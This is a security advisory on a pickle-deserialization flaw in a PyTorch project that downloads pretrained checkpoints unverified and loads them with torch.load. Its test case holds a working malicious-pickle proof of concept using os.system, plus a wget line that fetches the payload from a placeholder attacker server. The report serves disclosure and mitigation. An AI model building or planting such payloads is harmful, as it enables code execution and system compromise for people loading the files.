### Vulnerability List:

- Vulnerability Name: Pickle Deserialization in Pretrained Models
- Description:
    1. The project provides a script `scripts/download_models.sh` to download pretrained models from a remote Google Cloud Storage location.
    2. These downloaded models are expected to be loaded by the training and testing scripts using `torch.load` function from PyTorch.
    3. PyTorch's `torch.load` function, by default, uses Python's `pickle` module for deserialization.
    4. Python's `pickle` module is known to be vulnerable to deserialization attacks. If a pickle file is maliciously crafted, it can execute arbitrary code when loaded.
    5. A threat actor could potentially compromise the cloud storage location or perform a man-in-the-middle attack to replace the legitimate pretrained model files with malicious pickle files.
    6. When a user downloads and loads these compromised pretrained models using the project's scripts, the malicious code embedded in the pickle file will be executed on their machine.
- Impact:
    - Arbitrary code execution on the user's machine.
    - Full compromise of the user's system.
    - Potential for data theft, malware installation, or denial of service.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The project does not implement any security measures to verify the integrity or authenticity of the downloaded pretrained models. There are no checks like cryptographic signatures or checksums to ensure the models are from a trusted source and haven't been tampered with.
- Missing Mitigations:
    - **Integrity Checks:** Implement cryptographic signatures or checksums for the pretrained model files. The project should verify these signatures before loading the models to ensure they are from a trusted source and haven't been modified.
    - **Secure Deserialization Practices:** Explore safer alternatives to `pickle` for serializing and deserializing models, or implement secure loading mechanisms for pickle files to prevent arbitrary code execution.
    - **User Warnings:** Add clear warnings in the documentation (README.md) about the potential risks of using pretrained models from external sources and the importance of verifying their integrity.
- Preconditions:
    - The threat actor needs to be able to replace the legitimate pretrained model files hosted at `gs://graph_distillation/ckpt` or intercept the download process.
    - The user must execute the `scripts/download_models.sh` script to download the pretrained models.
    - The user must then run training or testing scripts that load these downloaded models using `torch.load`.
- Source Code Analysis:
    - **`scripts/download_models.sh`**:
        ```bash
        wget https://storage.googleapis.com/graph_distillation/ckpt/ntu-rgbd/depth.zip
        wget https://storage.googleapis.com/graph_distillation/ckpt/ntu-rgbd/jjd.zip
        ...
        ```
        This script uses `wget` to download zip files containing pretrained models from Google Cloud Storage. There is no verification of the downloaded files.
    - **`detection/model.py`** and **`classification/model.py`**:
        ```python
        def load(self, load_ckpt_paths, options, epoch=200):
            ...
            path = os.path.join(ckpt_path, 'embed_{}.pth'.format(epoch))
            ckpt = torch.load(path) # Potential vulnerability: pickle.load is used here
            try:
                self.embeds[i].load_state_dict(ckpt)
            except:
                utils.warn('Check that the "modalities" argument is correct.')
                exit(0)
            utils.info('{}: ckpt {} loaded'.format(self.modalities[i], path))
        ```
        The `load` functions in both `detection/model.py` and `classification/model.py` use `torch.load(path)` to load the model checkpoints. This function is vulnerable to pickle deserialization attacks if the file at `path` is maliciously crafted.

- Security Test Case:
    1. **Setup (Attacker):**
        - Create a malicious Python file (e.g., `malicious_payload.py`) with the following code to generate a malicious pickle file:
            ```python
            import torch
            import os

            class MaliciousModel(object):
                def __reduce__(self):
                    return (os.system, ('touch /tmp/pwned',)) # Example: create a file /tmp/pwned, can be replaced with more harmful commands

            model = MaliciousModel()
            torch.save(model, 'malicious_model.pth')
            ```
        - Run the malicious Python script: `python malicious_payload.py`. This will create a malicious pickle file named `malicious_model.pth`.
        - Create a zip archive containing `malicious_model.pth` (e.g., `malicious_depth.zip`).
        - Host `malicious_depth.zip` on a web server accessible to the victim machine (or, if possible, replace the original `depth.zip` in the cloud storage - **Note:** This step is for demonstration and should be done in a controlled environment and only if you have permissions to modify the cloud storage. For ethical testing, focus on MITM or local file replacement).

    2. **Action (Victim):**
        - Modify the `scripts/download_models.sh` script to download the malicious zip file instead of the legitimate one. For example, change the line:
            ```bash
            wget https://storage.googleapis.com/graph_distillation/ckpt/ntu-rgbd/depth.zip
            ```
            to:
            ```bash
            wget <URL_TO_YOUR_WEB_SERVER>/malicious_depth.zip -O depth.zip
            ```
        - Run the modified download script: `sh scripts/download_models.sh`. This will download and save the malicious zip file as `depth.zip`.
        - Run a script that uses the downloaded 'depth' model, for example: `sh scripts/test_pku_mmd.sh`.

    3. **Verification:**
        - After running the test script, check if the file `/tmp/pwned` exists on the victim's system. If it exists, it confirms that the arbitrary code execution was successful due to the pickle deserialization vulnerability.
        - **Important:** For real-world testing, replace the `touch /tmp/pwned` command with less harmful actions like printing a message to the console to avoid unintended damage. Never execute harmful commands on systems without explicit permission.